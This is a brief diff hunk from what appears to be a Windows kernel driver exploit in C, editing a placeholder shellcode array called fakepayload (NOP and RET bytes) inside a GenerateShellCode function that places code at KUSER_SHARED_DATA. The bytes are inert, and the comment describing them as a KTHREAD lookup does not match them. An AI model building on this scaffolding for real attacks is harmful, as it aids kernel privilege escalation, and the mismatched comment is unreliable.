@@ -297,7 +297,7 @@ void *GenerateShellCode(HANDLE driverHandle)
     int shellCodeLen=0;
     void *shellcode=NULL;
     const unsigned char fakepayload[] = {
-        "\x90\x90\x90\x90\x90\x90\x90\x90\xC3"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
+        "\x90\x90\x90\x90\x90\x90\x90\xC3\xC3"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
     } ;
     
     printf("[+] Shellcode is located at %p\n",KUSER_SHARED_DATA );
